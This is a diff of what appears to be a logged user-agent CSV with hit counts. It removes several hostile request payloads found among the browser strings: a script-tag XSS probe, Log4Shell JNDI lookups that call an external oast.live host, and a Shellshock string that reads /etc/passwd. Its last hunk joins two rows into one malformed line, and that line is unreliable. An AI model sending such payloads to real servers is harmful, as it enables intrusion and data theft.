@@ -376,7 +376,6 @@
 "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",4
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4) AppleWebKit/616.33 (KHTML, like Gecko) Version/17.6 Safari/616.33",4
 "Mozilla/5.0 (CentOS; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0",4
-"Xpanse, a Palo Alto Networks company, indexes customer network perimeters. If you have any questions or concerns, please reach out to: scaninfo@paloaltonetworks.com.",4
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.4.26",4
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.1",4
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/617.2.4.11.12",4
@@ -671,7 +670,6 @@
 "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",2
 "Mozilla/5.0 (CentOS; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",2
 "Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",2
-"</span><script>alert(document.domain)</script>",2
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0",2
 "Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",2
 "Mozilla/5.0 (Windows NT 10.0; rv:127.0) Gecko/20100101 Firefox/127.0",2
@@ -805,7 +803,6 @@
 "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",1
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)",1
 "Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",1
-"\x22Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML",1
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.3.18",1
 "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",1
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 8_2_1) AppleWebKit/579.51 (KHTML, like Gecko) Chrome/106.0.2564 Safari/537.36",1
@@ -904,10 +901,7 @@
 "Mozilla/5.0 (X11; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0",1
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1",1
 "Mozilla/5.0 (Fedora; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",1
-"${jndi:ldap://${:-550}${:-481}.${hostName}.useragent.cr3dnsode7149siofbfgmb53zzjtdj66s.oast.live}",1
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36",1
-"() { :; }; echo ; echo ; /bin/cat /etc/passwd",1
-"${jndi:ldap://127.0.0.1#.${hostName}.useragent.cr3dnsode7149siofbfgyz8mwpxb8ewrc.oast.live}",1
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 11) AppleWebKit/616.16 (KHTML, like Gecko) Version/17.0.90 Safari/616.16",1
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",1
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0",1
@@ -925,12 +919,9 @@
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 8_0_2) AppleWebKit/547.46 (KHTML, like Gecko) Chrome/96.0.2542 Safari/537.36",1
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool",1
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",1
-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",1
-"like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36\x22",1
 "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0",1
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 8_1_1) AppleWebKit/536.37 (KHTML, like Gecko) Chrome/104.0.429 Safari/537.36",1
-"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",1
-"2.0.1) Gecko/20100101 Firefox/4.0.1\x22",1
+"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",1"2.0.1) Gecko/20100101 Firefox/4.0.1\x22",1
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",1
 "Mozilla/5.0 (CentOS; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",1
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/548.51 (KHTML, like Gecko) Chrome/103.0.1497 Safari/537.36",1
